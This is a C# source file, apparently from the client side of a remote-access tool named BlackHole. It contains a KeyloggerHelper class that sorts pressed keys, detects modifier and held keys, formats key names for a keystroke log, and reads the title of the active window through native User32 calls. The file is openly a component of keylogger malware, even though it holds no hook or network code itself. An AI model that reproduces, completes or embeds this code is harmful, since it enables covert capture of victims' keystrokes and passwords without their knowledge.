using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using BlackHole.Slave.Helper.Native.Impl;

namespace BlackHole.Slave.Helper
{
    public static class KeyloggerHelper
    {
        public static bool IsModifierKeysSet(this List<Keys> pressedKeys) =>
            pressedKeys != null &&
                (pressedKeys.Contains(Keys.LControlKey)
                || pressedKeys.Contains(Keys.RControlKey)
                || pressedKeys.Contains(Keys.LMenu)
                || pressedKeys.Contains(Keys.RMenu)
                || pressedKeys.Contains(Keys.LWin)
                || pressedKeys.Contains(Keys.RWin)
                || pressedKeys.Contains(Keys.Control)
                || pressedKeys.Contains(Keys.Alt));
        
        public static bool IsModifierKey(this Keys key) =>
            key == Keys.LControlKey
            || key == Keys.RControlKey
            || key == Keys.LMenu
            || key == Keys.RMenu
            || key == Keys.LWin
            || key == Keys.RWin
            || key == Keys.Control
            || key == Keys.Alt;
        
        public static bool ContainsKeyChar(this List<Keys> pressedKeys, char c) => pressedKeys.Contains((Keys)char.ToUpper(c));

        public static bool IsExcludedKey(this Keys k) =>
            k >= Keys.A && k <= Keys.Z
            || k >= Keys.NumPad0 && k <= Keys.Divide
            || k >= Keys.D0 && k <= Keys.D9
            || k >= Keys.Oem1 && k <= Keys.OemClear
            || k >= Keys.LShiftKey && k <= Keys.RShiftKey
            || k == Keys.CapsLock
            || k == Keys.Space;

        public static bool DetectKeyHolding(List<char> list, char search) => list.FindAll(s => s.Equals(search)).Count > 1;

        public static string GetDisplayName(Keys key, bool altGr = false)
        {
            string name = key.ToString();
            if (name.Contains("ControlKey"))
                return "[Control]";
            if (name.Contains("Menu"))
                return "[Alt]";
            if (name.Contains("Win"))
                return "[Win]";
            if (name.Contains("Shift"))
                return "[Shift]";
            return name;
        }

        public static string GetActiveWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);
            User32.GetWindowText(User32.GetForegroundWindow(), sbTitle, sbTitle.Capacity);

            string title = sbTitle.ToString();
            return !string.IsNullOrEmpty(title) ? title : null;
        }
    }
}
